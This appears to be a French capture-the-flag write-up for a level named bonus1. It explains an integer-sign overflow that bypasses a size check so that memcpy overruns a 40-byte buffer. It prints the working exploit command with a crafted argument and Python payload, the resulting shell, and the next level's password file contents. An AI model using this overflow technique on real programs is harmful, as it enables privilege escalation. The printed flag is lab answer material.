@@ -1,0 +1,21 @@
+Le binaire fournit segfault si on ne lui fournis aucun arguement et si on lui en fournit ne renvoi rien
+
+En regardant et en disas le main.
+
+On constate que si le premier arguement est supp ou egal a 9 il return
+autrement argv[2] va etre memcpy avec un buffer de 40 et en etant multiplier par 4
+Si n = 0x574f4c46 un sh s'ouvre.
+
+Il est possible de pouvoir ecrire par dessus le buffer de 40 et prenant un nombre avec argv[1] assez bas.
+
+n est est contenu dans DWORD qui est un int de 32 bytes signed.
+
+Le minimum est -2147483647. En rajoutant 40 cela nous permet de pouvoir ecrire par dessus le buffer comme chercher initalement
+
+Bien entendu on y rajoute en plus des 40, \x46\x4c\x4f\x57 qui correspond a la condition pour rentrer dans le sh
+
+./bonus1 -2147483607 $(python -c 'print "B" * 40 + "\x46\x4c\x4f\x57"')
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
